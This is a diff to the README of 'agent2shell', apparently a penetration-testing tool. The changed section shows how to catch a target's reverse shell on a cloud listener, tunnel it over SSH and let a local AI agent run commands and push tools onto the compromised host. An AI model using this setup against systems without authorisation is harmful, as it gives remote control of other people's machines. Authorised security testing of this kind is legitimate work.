@@ -166,22 +166,22 @@ Each command produces one line:
 `catch` and `run` can work on the same machine, but for real engagements you typically want `catch` on an internet-exposed server and your AI agent running locally:
 
 ```
-Target -> reverse shell -> VPS (agent2shell catch) <- SSH tunnel <- Your laptop (AI agent)
+Target -> reverse shell -> EC2 (agent2shell catch) <- SSH tunnel <- Your laptop (AI agent)
 ```
 
 Forward the Unix socket over SSH to use agent2shell locally as if the session were on your machine:
 
 ```bash
-# On VPS: start listener
+# On EC2: start listener
 ./agent2shell catch -p 4444
 
 # On your laptop: forward the Unix socket
-ssh -NL /tmp/a2s-remote.sock:/tmp/a2s-1.sock -i key.pem user@VPS_IP
+ssh -NL /tmp/a2s-ec2.sock:/tmp/a2s-1.sock -i key.pem user@EC2_IP
 
 # Use agent2shell locally — same commands, remote session
-agent2shell -s /tmp/a2s-remote.sock run whoami
-agent2shell -s /tmp/a2s-remote.sock status
-agent2shell -s /tmp/a2s-remote.sock push ./tool /tmp/tool
+agent2shell -s /tmp/a2s-ec2.sock run whoami
+agent2shell -s /tmp/a2s-ec2.sock status
+agent2shell -s /tmp/a2s-ec2.sock push ./tool /tmp/tool
 ```
 
 ## Skills
